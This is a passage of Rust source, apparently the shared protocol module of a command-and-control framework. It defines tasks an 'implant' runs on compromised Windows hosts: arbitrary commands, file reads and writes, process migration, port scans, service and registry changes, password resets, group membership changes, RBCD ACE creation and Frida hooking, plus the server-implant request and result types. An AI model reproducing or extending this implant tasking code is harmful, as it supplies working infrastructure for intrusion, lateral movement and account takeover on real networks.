            Task::RegDeleteKey { .. } => Opcode::RegDeleteKey,
            Task::RegSetValue { .. } => Opcode::RegSetValue,
            Task::RegQueryValue { .. } => Opcode::RegQueryValue,
            Task::StartService { .. } => Opcode::StartService,
            Task::DeleteService { .. } => Opcode::DeleteService,
            Task::RegisterService { .. } => Opcode::RegisterService,
            Task::QueryLdap { .. } => Opcode::QueryLdap,
            Task::SetAdAttrStr { .. } => Opcode::SetAdAttrStr,
            Task::SetAdAttrBin { .. } => Opcode::SetAdAttrBin,
            Task::SetUserPassword { .. } => Opcode::SetUserPassword,
            Task::GetUserSid { .. } => Opcode::GetUserSid,
            Task::AddUserToLocalgroup { .. } => Opcode::AddUserToLocalgroup,
            Task::RemoveUserFromLocalgroup { .. } => Opcode::RemoveUserFromLocalgroup,
            Task::AddUserToGroup { .. } => Opcode::AddUserToGroup,
            Task::RemoveUserFromGroup { .. } => Opcode::RemoveUserFromGroup,
            Task::CreateRbcdAce { .. } => Opcode::CreateRbcdAce,
            Task::Conditional { .. } => Opcode::Conditional,
            Task::FridaHook { .. } => Opcode::FridaHook,
            Task::FridaUnhook { .. } => Opcode::FridaUnhook,
            Task::GetConst { .. } => Opcode::GetConst,
            Task::ShellExtract { .. } => Opcode::ShellExtract,
            Task::MemRead { .. } => Opcode::MemRead,
            Task::DllList { .. } => Opcode::DllList,
            Task::MemMap { .. } => Opcode::MemMap,
            Task::Malfind { .. } => Opcode::Malfind,
            Task::LdrCheck { .. } => Opcode::LdrCheck,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// HELPER FUNCTIONS FOR COMMON TASKS
// ═══════════════════════════════════════════════════════════════════════════

impl Task {
    /// Create a simple command execution task
    pub fn exec(command: impl Into<String>) -> Self {
        Task::RunCommand {
            command: ValueRef::String(command.into()),
        }
    }

    /// Create a sleep task
    pub fn sleep(ms: u32) -> Self {
        Task::Sleep { ms }
    }

    /// Create a file read task
    pub fn read_file(path: impl Into<String>) -> Self {
        Task::ReadFile {
            path: ValueRef::String(path.into()),
        }
    }

    /// Create a file write task
    pub fn write_file(path: impl Into<String>, content: impl Into<String>) -> Self {
        Task::WriteFile {
            path: ValueRef::String(path.into()),
            content: ValueRef::String(content.into()),
        }
    }

    /// Create a kill task
    pub fn kill() -> Self {
        Task::Kill { magic: None }
    }

    /// Get current working directory
    pub fn cwd() -> Self {
        Task::GetCwd
    }

    /// List running processes
    pub fn ps() -> Self {
        Task::ListProcs
    }

    /// Delete a file
    pub fn delete_file(path: impl Into<String>) -> Self {
        Task::DeleteFile {
            path: ValueRef::String(path.into()),
        }
    }

    /// Port scan
    pub fn portscan(targets: impl Into<String>, ports: impl Into<String>) -> Self {
        Task::Portscan {
            targets: ValueRef::String(targets.into()),
            ports: ValueRef::String(ports.into()),
        }
    }

    /// Exit the implant process
    pub fn exit_process() -> Self {
        Task::ExitProcess { exit_code: 0 }
    }

    /// Read memory at address (local). Address is hex string e.g. "7FF00000"
    pub fn mem_read(address: impl Into<String>, size: u64) -> Self {
        Task::MemRead {
            address: ValueRef::String(address.into()),
            size: ValueRef::Number(size as i64),
            pid: None,
        }
    }

    /// Read memory at address in a remote process. Address is hex string.
    pub fn mem_read_remote(address: impl Into<String>, size: u64, pid: u32) -> Self {
        Task::MemRead {
            address: ValueRef::String(address.into()),
            size: ValueRef::Number(size as i64),
            pid: Some(ValueRef::Number(pid as i64)),
        }
    }

    /// List loaded DLLs (local)
    pub fn dll_list() -> Self {
        Task::DllList { pid: None }
    }

    /// List loaded DLLs in a remote process
    pub fn dll_list_remote(pid: u32) -> Self {
        Task::DllList {
            pid: Some(ValueRef::Number(pid as i64)),
        }
    }

    /// Enumerate virtual memory regions (local)
    pub fn mem_map() -> Self {
        Task::MemMap { pid: None }
    }

    /// Enumerate virtual memory regions in a remote process
    pub fn mem_map_remote(pid: u32) -> Self {
        Task::MemMap {
            pid: Some(ValueRef::Number(pid as i64)),
        }
    }

    /// Find executable private memory (local)
    pub fn malfind() -> Self {
        Task::Malfind { pid: None }
    }

    /// Find executable private memory in a remote process
    pub fn malfind_remote(pid: u32) -> Self {
        Task::Malfind {
            pid: Some(ValueRef::Number(pid as i64)),
        }
    }

    /// Find executable private memory in ALL accessible processes
    /// Uses sentinel 0xFFFFFFFF to trigger enumeration (requires `enumerate` feature)
    pub fn malfind_all() -> Self {
        Task::Malfind {
            pid: Some(ValueRef::Number(0xFFFFFFFF_i64)),
        }
    }

    /// Cross-reference IMAGE regions against PEB module lists (local)
    pub fn ldr_check() -> Self {
        Task::LdrCheck { pid: None }
    }

    /// Cross-reference IMAGE regions against PEB module lists in a remote process
    pub fn ldr_check_remote(pid: u32) -> Self {
        Task::LdrCheck {
            pid: Some(ValueRef::Number(pid as i64)),
        }
    }

    /// Cross-reference IMAGE regions in ALL accessible processes
    /// Uses sentinel 0xFFFFFFFF to trigger enumeration (requires `enumerate` feature)
    pub fn ldr_check_all() -> Self {
        Task::LdrCheck {
            pid: Some(ValueRef::Number(0xFFFFFFFF_i64)),
        }
    }

    /// Migrate to process matching search string or PID
    pub fn migrate(search: impl Into<ValueRef>) -> Self {
        Task::Migrate { search: search.into(), task_id: None, magic: None }
    }

    /// Unhook Frida
    pub fn frida_unhook(name: Option<String>) -> Self {
        Task::FridaUnhook {
            hook_id: None,
            name: name.map(ValueRef::String),
        }
    }

    /// Hook a process with Frida
    pub fn frida_hook(
        url: impl Into<String>,
        script: impl Into<String>,
        name: Option<String>,
        callback_host: Option<String>,
        callback_port: Option<u16>,
        batch_size: Option<u32>,
        flush_interval: Option<u32>,
    ) -> Self {
        Task::FridaHook {
            url: ValueRef::String(url.into()),
            script: ValueRef::String(script.into()),
            name: name.map(ValueRef::String),
            callback_host: callback_host.map(ValueRef::String),
            callback_port,
            batch_size,
            flush_interval,
        }
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// REQUEST/RESPONSE TYPES
// ═══════════════════════════════════════════════════════════════════════════

/// Constant value for playbook
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(untagged)]
pub enum Constant {
    String(String),
    Hex { hex: String },
    Base64 { base64: String },
}

impl Constant {
    pub fn to_bytes(&self) -> Result<Vec<u8>, String> {
        match self {
            Constant::String(s) => Ok(s.as_bytes().to_vec()),
            Constant::Hex { hex } => {
                hex::decode(hex).map_err(|e| format!("Invalid hex: {}", e))
            }
            Constant::Base64 { base64 } => {
                use base64::Engine;
                base64::engine::general_purpose::STANDARD
                    .decode(base64)
                    .map_err(|e| format!("Invalid base64: {}", e))
            }
        }
    }
}

/// Request body for creating a task (client -> server)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Playbook {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub constants: Vec<Constant>,
    pub task_sets: HashMap<String, Vec<Task>>,
    /// Command name that created this playbook (for result formatting)
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command: Option<String>,
}

impl Playbook {
    pub fn new() -> Self {
        Self {
            constants: Vec::new(),
            task_sets: HashMap::new(),
            command: None,
        }
    }

    /// Create a playbook with a single task in task set 0
    pub fn with_task(task: Task) -> Self {
        let mut playbook = Self::new();
        playbook.task_sets.insert("0".to_string(), vec![task]);
        playbook
    }

    /// Create a playbook with a single task and command name
    pub fn with_task_cmd(task: Task, command: &str) -> Self {
        let mut playbook = Self::with_task(task);
        playbook.command = Some(command.to_string());
        playbook
    }

    /// Create a playbook with multiple tasks in task set 0
    pub fn with_tasks(tasks: Vec<Task>) -> Self {
        let mut playbook = Self::new();
        playbook.task_sets.insert("0".to_string(), tasks);
        playbook
    }

    /// Add a constant and return its index
    pub fn add_constant(&mut self, constant: Constant) -> u16 {
        let idx = self.constants.len() as u16;
        self.constants.push(constant);
        idx
    }
}

impl Default for Playbook {
    fn default() -> Self {
        Self::new()
    }
}

/// Response from server after creating a task
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskResponse {
    pub task_id: Uuid,
    pub bytecode: Vec<u8>,
}

/// Request to submit task results (implant -> server)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SubmitResultRequest {
    pub task_id: Uuid,
    pub result: Vec<u8>,
}

// ═══════════════════════════════════════════════════════════════════════════
// RESULT TYPES — mirror of implant structs, for postcard deserialization
// ═══════════════════════════════════════════════════════════════════════════

/// Process info from ListProcs (0x0E)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessInfo {
    pub pid: u32,
    pub ppid: u32,
    pub image: String,
    pub cmdline: Option<String>,
}

/// Loaded module info from DllList (0x45)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModuleInfo {
    pub base: usize,
    pub size: u32,
    pub name: String,
}

/// Virtual memory region from MemMap (0x46)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MemRegion {
    pub base: usize,
    pub size: usize,
    pub state: String,
    pub protect: String,
    pub alloc_protect: String,
    pub region_type: String,
    pub info: String,
}

/// Suspicious memory hit from Malfind (0x47)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MalfindHit {
    pub base: usize,
    pub size: usize,
    pub protect: String,
    pub alloc_protect: String,
    pub has_pe: bool,
    pub preview: Vec<u8>,
    #[serde(default)]
    pub threads: Vec<u32>,
}

/// LDR check result from LdrCheck (0x48)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct LdrCheckHit {
    pub base: usize,
    pub size: usize,
    pub in_load: bool,
    pub in_mem: bool,
    pub path: String,
}

/// Port scan result from PortScan (0x1C)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PortScanResult {
    pub host: String,
    pub port: u16,
    pub open: bool,
}

/// Process-scoped result wrapper for multi-process opcodes
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProcessResult<T> {
    pub pid: u32,
    pub image: String,
    pub results: Vec<T>,
}

/// Deserialize a postcard-encoded result by opcode into a JSON value.
/// Returns None if the opcode doesn't have a structured result type.
pub fn deserialize_result(opcode: Opcode, data: &[u8]) -> Option<serde_json::Value> {
    match opcode {
        Opcode::ListProcs => {
            let v: Vec<ProcessInfo> = postcard::from_bytes(data).ok()?;
            serde_json::to_value(&v).ok()
        }
        Opcode::Portscan => {
            let v: Vec<PortScanResult> = postcard::from_bytes(data).ok()?;
            serde_json::to_value(&v).ok()
        }
        Opcode::DllList => {
            let v: Vec<ProcessResult<ModuleInfo>> = postcard::from_bytes(data).ok()?;
            serde_json::to_value(&v).ok()
        }
        Opcode::MemMap => {
            let v: Vec<ProcessResult<MemRegion>> = postcard::from_bytes(data).ok()?;
            serde_json::to_value(&v).ok()
        }
        Opcode::Malfind => {
            let v: Vec<ProcessResult<MalfindHit>> = postcard::from_bytes(data).ok()?;
            serde_json::to_value(&v).ok()
        }
        Opcode::LdrCheck => {
            let v: Vec<ProcessResult<LdrCheckHit>> = postcard::from_bytes(data).ok()?;
            serde_json::to_value(&v).ok()
        }
        _ => None,
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// SERDE HELPERS
// ═══════════════════════════════════════════════════════════════════════════

mod hex_bytes {
    use serde::{Deserialize, Deserializer, Serializer};

    pub fn serialize<S>(bytes: &Vec<u8>, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        serializer.serialize_str(&hex::encode(bytes))
    }

    pub fn deserialize<'de, D>(deserializer: D) -> Result<Vec<u8>, D::Error>
    where
        D: Deserializer<'de>,
    {
        let s: String = String::deserialize(deserializer)?;
        hex::decode(&s).map_err(serde::de::Error::custom)
    }
}

mod base64_bytes {
    use base64::Engine;
    use serde::{Deserialize, Deserializer, Serializer};

    pub fn serialize<S>(bytes: &Vec<u8>, serializer: S) -> Result<S::Ok, S::Error>
    where
        S: Serializer,
    {
        let encoded = base64::engine::general_purpose::STANDARD.encode(bytes);
        serializer.serialize_str(&encoded)
    }

    pub fn deserialize<'de, D>(deserializer: D) -> Result<Vec<u8>, D::Error>
    where
        D: Deserializer<'de>,
    {
        let s: String = String::deserialize(deserializer)?;
        base64::engine::general_purpose::STANDARD
            .decode(&s)
            .map_err(serde::de::Error::custom)
    }
}
